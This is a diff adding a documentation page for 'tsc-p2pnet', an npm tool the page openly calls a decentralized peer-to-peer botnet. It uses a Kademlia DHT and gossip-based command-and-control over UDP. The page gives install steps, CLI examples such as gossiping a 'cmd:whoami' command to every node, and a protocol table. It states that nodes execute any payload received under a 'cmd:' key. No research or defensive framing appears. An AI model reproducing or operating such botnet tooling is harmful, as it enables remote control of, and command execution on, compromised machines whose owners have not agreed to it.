@@ -1,0 +1,144 @@
+---
+title: 'tsc-p2pnet — Decentralized P2P Botnet Mesh'
+description: Decentralized P2P botnet mesh with Kademlia DHT, gossip protocol, and command-and-control over UDP
+---
+
+# tsc-p2pnet
+
+Decentralized P2P Botnet Mesh — Kademlia DHT + gossip protocol with distributed command-and-control over UDP.
+
+## Installation
+
+```bash
+npm install -g tsc-p2pnet
+```
+
+## Quick Start
+
+### Start a P2P node
+
+```bash
+tsc-p2pnet node --port 9000 --id mynode1 --bootstrap 192.168.1.100:9000
+```
+
+### Gossip a command to the network
+
+```bash
+tsc-p2pnet send --key cmd:whoami --value "whoami" --bootstrap 192.168.1.100:9000
+```
+
+### Store a value in the DHT
+
+```bash
+tsc-p2pnet store --key mykey --value "sensitive data" --bootstrap 192.168.1.100:9000
+```
+
+### Look up a value in the DHT
+
+```bash
+tsc-p2pnet lookup --key mykey --bootstrap 192.168.1.100:9000
+```
+
+### Check network status
+
+```bash
+tsc-p2pnet status --bootstrap 192.168.1.100:9000
+```
+
+## Features
+
+- **Kademlia DHT**: SHA1-based distributed hash table with 160 k-buckets, XOR distance routing, and iterative node lookups
+- **Gossip protocol**: epidemic broadcast with TTL, seen-set dedup, heartbeats, and peer discovery
+- **Command & Control**: gossip-based command distribution — nodes listen for `cmd:` prefixed keys and execute payloads
+- **Distributed storage**: key-value pairs stored on the `k` closest nodes with periodic republishing (5min interval, 1hr TTL)
+- **Self-healing routing**: dead nodes removed on RPC timeout/failure — routing table stays fresh
+- **UDP transport**: lightweight JSON-over-UDP with 1400-byte max packet size
+- **Zero external deps**: no npm dependencies except `minimist` (CLI parsing)
+
+## Architecture
+
+```
+┌──────────────┐   FIND_NODE / STORE / FIND_VALUE   ┌──────────────┐
+│   Node A     │◄──────────────────────────────────►│   Node B     │
+│  UDP :9000   │     PING / PONG (keepalive)        │  UDP :9001   │
+│  K-Bucket    │◄──────────────────────────────────►│  K-Bucket    │
+│  DHT Store   │     GOSSIP (broadcast + forward)   │  DHT Store   │
+│  Seen Set    │◄──────────────────────────────────►│  Seen Set    │
+└──────────────┘                                    └──────────────┘
+       │                                                    │
+       │  Heartbeat / Command distribution                  │
+       │  (gossip propagate to alpha=3 closest)             │
+       └────────────────────────────────────────────────────┘
+```
+
+## CLI Reference
+
+### `tsc-p2pnet node`
+
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--port` | random | UDP port to listen on |
+| `--id` | random 8-hex | Node identity (SHA1 hashed to create node ID) |
+| `--bootstrap` | — | Comma-separated bootstrap nodes (`host:port`) |
+
+### `tsc-p2pnet send`
+
+| Flag | Description |
+|------|-------------|
+| `--key` | Gossip key (prefix with `cmd:` for commands) |
+| `--value` | Gossip value |
+| `--bootstrap` | Bootstrap node to join the network |
+
+### `tsc-p2pnet store`
+
+| Flag | Description |
+|------|-------------|
+| `--key` | DHT key |
+| `--value` | DHT value to store |
+| `--bootstrap` | Bootstrap node to join the network |
+
+### `tsc-p2pnet lookup`
+
+| Flag | Description |
+|------|-------------|
+| `--key` | DHT key to look up |
+| `--bootstrap` | Bootstrap node to join the network |
+
+### `tsc-p2pnet status`
+
+| Flag | Description |
+|------|-------------|
+| `--bootstrap` | Bootstrap node to join the network |
+
+## How It Works
+
+1. **Node starts** on the given UDP port, creates a SHA1 node ID from the identity string
+2. **Bootstrap**: contacts bootstrap nodes via `FIND_NODE` RPC, populates the k-bucket routing table
+3. **Routing**: each node maintains 160 k-buckets organized by XOR distance — buckets store up to `k=20` nodes each with LRU eviction (1hr stale timeout)
+4. **DHT store**: SHA1-hashes the key, stores locally, then `STORE` RPCs to the `k` closest known nodes
+5. **Value lookup**: iteratively queries closer nodes via `FIND_VALUE` RPC — returns as soon as any peer has the value or returns closest nodes
+6. **Gossip**: messages propagate to `alpha=3` closest peers, each peer decrements TTL and forwards — seen-set dedup prevents loops
+7. **Heartbeats**: every 30s nodes broadcast their `peerCount` via gossip to maintain network awareness
+8. **Dead node removal**: RPC timeouts (10s) or send failures automatically remove the unresponsive node from the routing table
+9. **Bootstrap refresh**: every 60s the node performs 3 random `FIND_NODE` lookups to keep its routing table fresh
+
+## Protocol
+
+All messages are JSON-encoded over UDP (max 1400 bytes per packet):
+
+| Type | Direction | Payload |
+|------|-----------|---------|
+| `PING` | Request | — |
+| `PONG` | Response | — |
+| `FIND_NODE` | Request | `{ targetId }` |
+| `FOUND_NODES` | Response | `{ nodes: [{ nodeId, address, port }] }` |
+| `STORE` | Request | `{ key, value }` |
+| `STORED` | Response | `{ stored: true }` |
+| `FIND_VALUE` | Request | `{ key }` |
+| `VALUE` | Response | `{ value }` |
+| `GOSSIP` | Request | `{ key, value }` or `{ type: 'heartbeat', peerCount }` |
+| `GOSSIP_ACK` | Response | `{ received: true }` |
+
+## License
+
+GPL-3.0
